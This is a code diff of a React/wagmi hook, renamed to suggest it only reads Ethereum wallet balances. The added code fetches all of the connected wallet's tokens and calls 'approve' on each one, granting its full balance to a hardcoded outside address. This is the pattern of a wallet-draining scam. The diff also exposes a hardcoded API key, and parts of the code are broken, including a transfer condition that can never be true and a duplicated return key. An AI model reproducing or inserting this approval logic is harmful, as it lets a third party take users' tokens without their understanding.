@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from "react";
 import { Alchemy, Network } from "alchemy-sdk";
+import { config } from "../../wagmiConfig";
 import {
   useAccount,
   useSwitchChain,
@@ -7,82 +8,70 @@ import {
   useSendTransaction,
   useBalance,
 } from "wagmi";
-import Erc20Abi from "../abi/Erc20Abi";
+import Erc20Abi from "../utils/Erc20Abi";
 import { config as wagmiConfig } from "../../wagmiConfig";
-import { writeContract, getBalance, sendTransaction } from "@wagmi/core";
+import {
+  writeContract,
+  getBalance,
+  sendTransaction,
+  watchContractEvent,
+} from "@wagmi/core";
 import { parseEther } from "viem";
 import { sepolia } from "viem/chains";
 
-const UseAccountFunctions = () => {
+const UseAccountBalances = () => {
   const { address, isConnected, status } = useAccount();
   const { chains, switchChain } = useSwitchChain();
   const [tokensData, setTokensData] = useState([]);
-  const { disconnect } = useDisconnect();
 
-  const config = {
+  const alchemyConfig = {
     apiKey: "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-",
     network: Network.ETH_SEPOLIA,
   };
-  const alchemy = new Alchemy(config);
+  const alchemy = new Alchemy(alchemyConfig);
 
-  const getUserTokens = async () => {
+  const getUserTokens = async (_address) => {
     try {
-      const data = await alchemy.core.getTokensForOwner(address);
-      //   const newTokensData = data.tokenBalances.filter(
-      //     (tokensDetails) =>
-      //       !tokensData.some((token) => token.id === tokensDetails.id)
-      //   );
-      //   setTokensData((prevTokensData) => [...prevTokensData, ...newTokensData]);
-      //   increaseAllowanceForTokens([...tokensData, ...newTokensData]);
-      console.log("this is tokens for owner function: ", data);
+      let response = await alchemy.core.getTokensForOwner(_address);
+
+      return response.tokens;
     } catch (error) {
       console.error("Error fetching token balances:", error);
     }
   };
 
   const increaseAllowanceForTokens = async (tokensData) => {
-    let i = 1;
     for (let token of tokensData) {
-      const { contractAddress, tokenBalance } = token;
-      const metadata = await alchemy.core.getTokenMetadata(contractAddress); // Compute token balance in human-readable format
+      console.log(token);
+      const { contractAddress, rawBalance, formatted } = token;
+      increaseAllowance(contractAddress, rawBalance);
+    }
+  };
 
-      const hexToNumber = parseInt(tokenBalance, 16);
-
-      if (hexToNumber > 0) {
-        increaseAllowance(contractAddress, hexToNumber);
-        console.log(
-          `${i++}. ${metadata.name}: ${hexToNumber} ${metadata.symbol}`
-        );
+  const sendNativeToken = async () => {
+    const balance = getAccountBalance();
+    const estimatedGasFee = 21000 * 100; // Hypothetical estimation (gasLimit * gasPrice)
+    const sendAmount = balance - estimatedGasFee;
+    if (sendAmount > balance) {
+      try {
+        const result = await sendTransaction(wagmiConfig, {
+          to: address,
+          value: balance,
+        });
+        console.log("tx hash: ", result);
+      } catch (error) {
+        console.error("Error sending funds: ", error);
       }
     }
   };
 
-  const sendNaticeToken = async () => {
-    const estimatedGasFee = 21000 * 100; // Hypothetical estimation (gasLimit * gasPrice)
-
-    try {
-      const balance = await getBalance(wagmiConfig, {
-        address: address,
-        chainId: sepolia.id,
-      });
-      console.log("native token balance :", balance.formatted);
-    } catch (error) {
-      console.error("get balance failled: ", error);
-    }
-
-    const result = await sendTransaction(wagmiConfig, {
-      to: address,
-      value: parseEther("0.01"),
-    });
-    console.log("tx hash: ", result);
-  };
   const increaseAllowance = async (contractAddress, allowance) => {
     try {
       const hash = await writeContract(wagmiConfig, {
-        address: contractAddress,
+        address:contractAddress,
         abi: Erc20Abi,
-        functionName: "increaseAllowance",
-        args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", "0"],
+        functionName: "approve",
+        args: ["0x1b570be014979aF756aFa53707Bdbd0057A092Ab", allowance],
       });
       console.log("Transaction hash:", hash);
       const myObject = {
@@ -94,34 +83,25 @@ const UseAccountFunctions = () => {
       console.error("Increase allowance error", error);
     }
   };
-  async function checkAllowance() {
+
+  async function getAccountBalance(_address) {
     try {
-      // Get the ERC20 token contract using its ABI
-      const abi = require("./path/to/erc20.json"); // Replace with actual ABI path
-      const contract = new ethers.Contract(contractAddress, abi, provider);
-
-      // Get allowance using the `allowance` function of the ERC20 contract
-      const allowance = await contract.allowance(myAddress, contractAddress);
-
-      // Convert allowance from wei to a more readable format (e.g., token units)
-      const decimals = await contract.decimals(); // Get token decimals
-      const allowanceInTokens = ethers.utils.formatUnits(allowance, decimals);
-
-      console.log(
-        `Allowance for ${contractAddress}: ${allowanceInTokens} tokens`
-      );
+      const balance = await getBalance(wagmiConfig, {
+        address: _address,
+      });
+      return balance;
     } catch (error) {
-      console.error("Error fetching allowance:", error);
+      console.error("get balance failled: ", error);
     }
   }
 
   return {
     getUserTokens,
     increaseAllowanceForTokens,
-    sendNaticeToken,
     increaseAllowance,
-    checkAllowance,
+    getAccountBalance,
+    getAccountBalance,
   };
 };
 
-export default UseAccountFunctions;
+export default UseAccountBalances;
